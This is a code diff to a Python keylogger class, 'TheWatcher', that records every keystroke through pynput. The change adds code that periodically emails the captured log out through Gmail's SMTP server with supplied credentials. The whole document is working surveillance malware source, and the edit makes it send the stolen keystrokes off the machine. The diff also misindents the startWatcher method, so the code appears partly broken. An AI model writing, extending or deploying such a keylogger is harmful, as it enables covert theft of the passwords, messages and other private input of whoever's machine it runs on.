@@ -1,13 +1,18 @@
 import pynput.keyboard as keyboard
+import smtplib
 import threading
 
 class TheWatcher:
- def __init__(self):
+ def __init__(self, email_timer, email, passwd):
   self.log = ""
+  self.email_T = email_timer
+  self.email = email
+  self.passwd = passwd
 
  def log_appender(self,string):
   self.log = self.log + string
 
+# defining callback functions also special characters
  def callingBack(self, key):
   try:
    current_key = str(key.char)
@@ -18,13 +23,23 @@ class TheWatcher:
     current_key = " " + str(key) + " "
   self.log_appender(current_key)
 
+# setup Email Functionality 
+ def send_email(self, email, passwd, msg):
+  server = smtplib.SMTP("smtp.gmail.com", 587)
+  server.starttls()
+  server.login(email,passwd)
+  server.sendmail(email,email,msg)
+  server.quit()
+
+# sending report to email 
  def report(self):
-  print(self.log)
+  self.send_email(self.email, self.passwd, self.log)
   self.log = ""
-  start_Timer = threading.Timer(5, self.report)
+  start_Timer = threading.Timer(self.email_T, self.report)
   start_Timer.start()
 
- def startWatcher(self):
+# Starting listener
+def startWatcher(self):
   key_Listener = keyboard.Listener(on_press=self.callingBack)
   with key_Listener:
    self.report()
